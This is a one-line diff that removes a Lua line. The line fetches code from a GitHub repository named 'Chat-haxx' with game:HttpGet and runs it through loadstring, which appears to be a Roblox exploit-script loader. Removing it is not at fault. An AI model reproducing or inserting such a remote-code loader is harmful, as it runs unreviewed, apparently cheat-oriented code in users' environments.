@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/LeoVerem14/Chat-haxx/main/Main")))()
